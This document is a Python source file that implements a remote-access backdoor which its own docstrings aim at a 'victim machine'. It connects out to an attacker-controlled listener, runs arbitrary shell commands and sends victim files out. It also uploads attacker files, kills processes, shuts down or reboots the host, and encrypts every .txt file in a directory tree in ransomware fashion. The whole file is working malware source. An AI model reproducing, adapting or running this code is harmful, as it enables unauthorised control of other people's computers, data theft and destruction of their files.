__author__ = "Abenezer"

from Imports import *
from cryptography.hazmat.primitives.asymmetric import dh
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes

class KeyExchange:
    def __init__(self):
        # Use fixed parameters for consistency
        p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
        g = 2
        self.parameters = dh.DHParameterNumbers(p, g).parameters()
        # Generate private key
        self.private_key = self.parameters.generate_private_key()
        # Get public key
        self.public_key = self.private_key.public_key()
        
    def get_public_key_bytes(self):
        return self.public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        
    def generate_shared_key(self, peer_public_key_bytes):
        try:
            peer_public_key = serialization.load_pem_public_key(peer_public_key_bytes)
            shared_key = self.private_key.exchange(peer_public_key)
            # Derive a key using HKDF
            derived_key = HKDF(
                algorithm=hashes.SHA256(),
                length=32,
                salt=None,
                info=b'handshake data',
            ).derive(shared_key)
            # Format the key for Fernet (must be 32 bytes, base64 encoded)
            return base64.urlsafe_b64encode(derived_key)
        except Exception as e:
            print(f"Error generating shared key: {str(e)}")
            return None

class Encrypto:
    """A class for encrypting/decrypting diractory level text files --> (.txt) files only"""
    def __init__(self, key=None):
        if key:
            self.key = key
        else:
            self.key = Fernet.generate_key()
        self.fernetObject = Fernet(self.key)
        self.cipherText = "" 
        self.PlainText = ""
        if not key:
            self.saveKey()

        
    def encrypt(self):
        for path,_,files in os.walk('./'):
            if files:
                for f in files:
                    if f.endswith('.txt'): # You can change your file extension here
                        try:
                            with open(os.path.join(path,f),'rb') as file:
                                self.cipherText = self.fernetObject.encrypt(file.read())
                                
                            with open(os.path.join(path,f),'wb') as file:
                                file.write(self.cipherText)
                                
                            self.cipherText = ""
                        except Exception as e:
                            print(f"Error encrypting {f}: {str(e)}")
                            
                        
    def saveKey(self):
        if not os.path.isfile('FernetKey.txt'):
            with open('FernetKey.txt','wb') as file:
                file.write(self.key)
            
                        
    def decrypt(self):
        try:
            if os.path.isfile('FernetKey.txt'):
                with open("FernetKey.txt",'rb') as file:
                    self.key = file.read()
                    self.fernetObject = Fernet(self.key)
                    
            for path,_,files in os.walk('./'):
                if files:
                    for f in files:
                        if f.endswith('.txt'):
                            try:
                                with open(os.path.join(path,f),'rb') as file:
                                    self.PlainText = self.fernetObject.decrypt(file.read())
                                
                                with open(os.path.join(path,f),'wb') as file:
                                    file.write(self.PlainText)
                                    
                                self.PlainText = ""
                            except Exception as e:
                                print(f"Error decrypting {f}: {str(e)}")
        except Exception as e:
            print(f"Error in decrypt: {str(e)}")
                        
    def __str__(self) -> str:
        return "Encrypto"



class Backdoor:
    def __init__(self,ip,port):        
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        # Initialize key exchange
        self.key_exchange = KeyExchange()
        # Send our public key
        self.send(self.key_exchange.get_public_key_bytes())
        # Receive peer's public key and generate shared key
        peer_public_key = self.recive(self.connection)
        if isinstance(peer_public_key, str):
            peer_public_key = base64.b64decode(peer_public_key)
        self.shared_key = self.key_exchange.generate_shared_key(peer_public_key)
        if self.shared_key is None:
            print("Failed to establish secure connection")
            self.connection.close()
            return
        # Initialize encryption with shared key
        self.encrypto = Encrypto(self.shared_key)

    
    def listOfProcesses(self):
        """A function used for listing all the background processes of the victim machine"""
        pid_dict = {}
        for pid in psutil.pids():
            pid_dict[pid] = psutil.Process(pid).name()
        
        return pid_dict


    def killProcessByName(self,processName):    
        """A function used for killing background processes form the victim machine"""
        PID = None
        listOfProcess = self.listOfProcesses()
        try:
            for pid,pidName in listOfProcess.items():
                if pidName == processName:
                    PID = pid
                    break
                
            if PID != None:        
                process = psutil.Process(PID)
            else:
                print(f"Error: No process named {processName} found!")
                print("Please make  Sure the process exist and try again!")
                exit(1)
                
        except Exception as e:
            exit(1)
            
        else:
            for proc in process.children(recursive=True):
                proc.kill()
            process.kill()
            return "Process killed successfully!"

        
    def recive(self,conn):
        """A function used for reciving commands from the attacker machine"""
        json_data = ""
        while True:
            try:
                data = conn.recv(1024)
                if not data:
                    continue
                json_data += data.decode()
                try:
                    data = json.loads(json_data)
                    if isinstance(data, str) and data.startswith('base64:'):
                        return base64.b64decode(data[7:])
                    return data
                except json.JSONDecodeError:
                    continue
            except Exception as e:
                print(f"Error receiving data: {str(e)}")
                continue
    
    
    def sysInfo(self):
        """A function used for getting the systemInfo of the victim machine"""
        try:
            info={}
            info['platform']=platform.system()
            info['platform-release']=platform.release()
            info['platform-version']=platform.version()
            info['architecture']=platform.machine()
            info['hostname']=socket.gethostname()
            info['ip-address']=socket.gethostbyname(socket.gethostname())
            info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
            info['ram']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+"GB"
            return info
        except Exception as e:
            logging.exception(e)
            
            
    def shutDown(self):
        """A function used for shutDowning the victim machine"""
        if platform.system() == "Windows":
            os.system("shutdown /s /t 0")
        else:
            os.system("systemctl poweroff")
   
            
    def restart(self):
        """A function used for restarting the victim machine"""
        if platform.system() == 'Windows':
            os.system("shutdown /r /t 0")
        else:
            os.system("systemctl reboot")
    
            
    def logOut(self): 
        """A function used for loging out the victim machine"""
        if platform.system() == "Windows":
            os.system("shutdown /l /t 0")
        else:
            os.system("pkill --KILL -U {0}".format(subprocess.check_output('uname -n',shell=True,text=True)))
            
    
    def download(self,path):
        """A function used for sending the victim files to the attacker machine"""
        with open(path, 'rb')  as file:
           return base64.b64encode(file.read())
        
        
    def upload(self,path,data):
        "A function used for writing(downloading) the attacker's file to the victim machine"
        with open(path,'wb') as file:
            file.write(base64.b64decode(data))    
    
    
    def send(self,data):
        """A function used for sending command response to the attacker machine"""
        if isinstance(data, bytes):
            data = base64.b64encode(data).decode()
        self.connection.send(json.dumps(data).encode())
        
        
    def changeDir(self,path):
        """A function used for changing the current working diractory of the victim maching"""
        os.chdir(path)
        return " changed diractory to {}".format(path)
        
        
    def executeSystemCommand(self,command):
        """A function used for executing system commands on the victim machine"""
        try:
            if platform.system() == "Windows":
                # Convert list command to string for Windows
                if isinstance(command, list):
                    command = " ".join(command)
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            else:
                # For Unix-like systems
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return result
        except subprocess.CalledProcessError as e:
            return f"Error executing command: {str(e)}".encode()
        except Exception as e:
            return f"Error: {str(e)}".encode()
    
    
    def startBackdoor(self):
        """A function used for starting the backdoor"""
        resultList = ""
        while True:
            try:
                command = self.connection.recv(1024).decode()
                if not command:
                    continue
                    
                command = json.loads(command).split()
                if command[0] == "exit":
                    self.connection.close()
                    os.system('clear')
                    exit(0)         
                    
                elif command[0].lower() == "sysinfo" and len(command) == 1:
                    self.send(self.sysInfo())
                    
                elif command[0].lower() == "bgps" and len(command) == 1:
                    self.send(self.listOfProcesses())

                elif command[0].lower() == "kill" and len(command) > 1:
                    self.send(self.killProcessByName(command[1]))
                    
                elif command[0].lower() == "encrypt" and len(command) == 1:
                    self.encrypto.encrypt()
                    self.send("Encryption completed successfully!")
                    
                elif command[0].lower() == "decrypt" and len(command) == 1:
                    try:
                        self.encrypto.decrypt()
                        self.send("Decryption completed successfully!")
                    except Exception as e:
                        self.send(f"Error during decryption: {str(e)}")
                    
                elif command[0].lower() == "cd" and len(command) > 1:
                    self.send(self.changeDir(command[1]))
                    
                elif command[0].lower() == "download" and len(command) > 1:
                    self.send(self.download(command[1]).decode())
                
                elif command[0].lower() == "upload" and len(command) > 1:
                    self.send("Okay Sir")
                    self.upload(command[1],self.recive(self.connection))
                
                elif command[0].lower() == "shutdown" and len(command) == 1:
                    self.shutDown()
                    
                elif command[0].lower() == "restart" and len(command) == 1:
                    self.restart()
                    
                elif command[0].lower() == "logout" and len(command) == 1:
                    self.logOut()
                    
                else:
                    result = self.executeSystemCommand(command)
                    result = result.decode().split('\n')
                    for i in result:
                        resultList += i
                        resultList += '\n'
                    self.send(resultList)
                    resultList = ""
            except Exception as e:
                self.send(f"Error: {str(e)}")
                continue

                
    def __str__(self) -> str:
        return f'Backdoor'


                
def main():
    """The main function"""
    
    backdoor = Backdoor('localhost',4444)
    backdoor.startBackdoor()


if __name__ == "__main__":
    main()
